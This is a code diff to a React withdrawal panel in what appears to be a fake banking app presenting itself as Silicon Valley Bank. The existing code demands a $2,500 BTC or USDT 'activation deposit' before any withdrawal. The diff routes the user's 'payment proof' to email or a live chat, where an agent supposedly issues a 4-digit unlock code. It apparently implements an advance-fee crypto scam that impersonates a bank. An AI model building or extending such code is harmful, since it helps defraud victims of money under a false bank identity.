@@ -3,6 +3,10 @@ import { User, Transaction } from '../types';
 import { api } from '../services/api';
 import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
 import { ArrowUpRight, Landmark, CreditCard, DollarSign, AlertCircle, CheckCircle2, ShieldCheck, Key, X, ShieldAlert, Clock, Copy, Check, FileText } from 'lucide-react';
+import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
+import { triggerOpenSVBLiveChat } from './SupportChatWidget';
+import { openLiveAgentEmail } from '../utils/supportEmail';
+import { BackButton } from './BackButton';
 
 interface WithdrawPanelProps {
   user: User;
@@ -28,6 +32,7 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
   // Deposit $2,500 USD requirement modal state
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
+  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
   const [submittingDeposit, setSubmittingDeposit] = useState(false);
   const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
@@ -66,8 +71,40 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
     setTimeout(() => setCopiedAddress(false), 2000);
   };
 
-  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
+  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    setShowProofOptionsModal(true);
+  };
+
+  const handleSelectLiveAgent = async () => {
+    setShowProofOptionsModal(false);
+    setShowCryptoModal(false);
+    
+    // Launch user's default email client
+    openLiveAgentEmail(user, {
+      method: cryptoMethod,
+      amount: 2500,
+      walletAddress: walletAddresses[cryptoMethod]
+    });
+
+    try {
+      const res = await api.submitCryptoActivationDeposit({
+        cryptoMethod,
+        txHash: '',
+        proofNote: 'Submitted to Live Agent (External Email)',
+        proofImage: undefined
+      });
+      if (res.user && onSuccess) {
+        onSuccess(res.user, null as any);
+      }
+      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
+      setTimeout(() => setDepositSuccessMsg(null), 5000);
+    } catch (err: any) {
+      console.error(err);
+    }
+  };
+
+  const handleSelectSVBLive = async () => {
     setError(null);
     setSubmittingDeposit(true);
 
@@ -81,14 +118,15 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
       if (res.user && onSuccess) {
         onSuccess(res.user, null as any);
       }
-      setDepositSuccessMsg(`Your $2,500 ${cryptoMethod} deposit proof has been submitted to Silicon Valley Bank for verification.`);
+      setShowProofOptionsModal(false);
+      setShowCryptoModal(false);
+      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
+      
+      // Open Live Chat Widget
       setTimeout(() => {
-        setShowCryptoModal(false);
+        triggerOpenSVBLiveChat();
         setDepositSuccessMsg(null);
-        if (onNavigateTab) {
-          onNavigateTab('support');
-        }
-      }, 800);
+      }, 500);
     } catch (err: any) {
       setError(err.message || 'Failed to submit activation deposit proof.');
     } finally {
@@ -159,6 +197,11 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
 
   return (
     <div className="max-w-2xl mx-auto space-y-6">
+      {/* Top Navigation Row */}
+      <div className="flex items-center justify-between">
+        <BackButton />
+      </div>
+
       {/* Header Banner */}
       <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl relative overflow-hidden">
         <div className="flex items-center gap-4">
@@ -588,6 +631,18 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
           </div>
         </div>
       )}
+
+      {/* Payment Proof Options Modal */}
+      <PaymentProofOptionsModal
+        isOpen={showProofOptionsModal}
+        onClose={() => setShowProofOptionsModal(false)}
+        user={user}
+        cryptoMethod={cryptoMethod}
+        walletAddress={walletAddresses[cryptoMethod]}
+        onSelectLiveAgent={handleSelectLiveAgent}
+        onSelectSVBLive={handleSelectSVBLive}
+        submitting={submittingDeposit}
+      />
     </div>
   );
 };
